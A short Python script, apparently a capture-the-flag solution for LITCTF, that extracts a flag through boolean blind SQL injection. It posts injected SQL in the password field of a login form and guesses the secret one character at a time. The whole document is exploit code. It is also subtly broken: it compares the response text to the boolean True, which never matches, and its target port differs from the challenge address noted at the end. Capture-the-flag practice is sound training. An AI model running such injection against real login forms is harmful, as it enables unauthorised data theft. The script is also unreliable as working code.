
import requests
import string

psw = "LITCTF{"
i = len(psw) + 1
while True:
    for c in string.printable:
        password = f"' or (SELECT case substr(name,1,{i}) when '{psw+c}' then 1 else 0 end)--"
        url = f"http://litctf.live:31781/"
        
        r = requests.post(url, {"username": "admin", "password": password})
        print(r.text)
        if r.text == True:
            psw += c
            i += 1
            print(psw)
            break
        print(psw+c)
    
    if c == "}":
        break
print("FLAG:", psw)

< challenge --> http://litctf.live:31770/ >
